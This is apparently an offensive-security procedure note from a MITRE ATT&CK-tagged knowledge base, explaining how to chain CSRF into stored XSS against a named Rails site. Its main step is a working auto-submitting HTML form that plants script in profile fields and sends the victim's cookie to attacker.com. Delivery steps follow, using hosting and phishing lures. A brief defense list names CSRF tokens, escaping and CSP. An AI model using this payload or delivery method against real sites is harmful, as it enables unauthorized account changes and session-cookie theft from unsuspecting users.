---
id: proc-002
tags:
  - csrf
  - xss
  - poc
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:03.409Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-CSRF-PoC-to-Inject-XSS-Payloads

## Summary

This procedure crafts and delivers a proof-of-concept (PoC) HTML form to exploit CSRF vulnerabilities, forging updates to user profiles with malicious XSS payloads in fields like username and full name.

## Description

Targeted at web apps like FanFootage (Ruby on Rails), the PoC tricks an authenticated victim into submitting a hidden form from an attacker site, updating their profile without consent. This can inject stored XSS if fields are unsanitized, leading to script execution on profile views. Prerequisites: Confirmed vulnerable endpoint and victim luring method (e.g., phishing). Outcomes: Profile tampering and potential data exfiltration via XSS.

## Requirements

1. Vulnerable endpoint details (e.g., POST /users/update with user[] params)
2. Attacker-controlled hosting for the HTML PoC
3. Victim authenticated and visitable to the PoC page

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens and validate on server-side
- Sanitize/escape user inputs in profile fields to prevent XSS
- Implement Content Security Policy (CSP) to block inline scripts
- Log and alert on profile changes from suspicious IPs

## Objectives

1. Forge unauthorized profile update via CSRF
2. Inject executable XSS payloads for escalation
3. Demonstrate impact like alert execution or cookie theft

## Instructions

### Step 1: Create Malicious HTML Form

**Context**: Build a hidden auto-submitting form with XSS payloads in target fields.

Use a text editor to create PoC.html with form action set to the vulnerable endpoint, including hidden inputs for parameters like _method=patch and malicious values.

Example content:

```html
<!DOCTYPE html>
<html><body>
<form action="https://fanfootage.com/users/update" method="POST" id="exploit">
<input type="hidden" name="utf8" value="&#x2713;">
<input type="hidden" name="_method" value="patch">
<input type="hidden" name="user[username]" value="&lt;script&gt;alert(1)&lt;/script&gt;">
<input type="hidden" name="user[full_name]" value="&lt;script&gt;document.location='https://attacker.com?cookie='+document.cookie&lt;/script&gt;">
</form>
<script>document.getElementById('exploit').submit();</script>
</body></html>
```

### Step 2: Host and Deliver PoC

**Context**: Serve the HTML and lure the victim to load it while authenticated.

Host the file on a server (e.g., GitHub Pages or local ngrok) and send a link via email/social engineering. Upon visit, the form submits automatically.

Verify by logging into a test account, visiting the PoC, then checking profile for injected payload and triggering XSS on view.

> Expected output: Profile fields contain script tags; on render, alert(1) fires or data exfiltrates.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[xss]]
- [[exploitation]]
- [[web]]
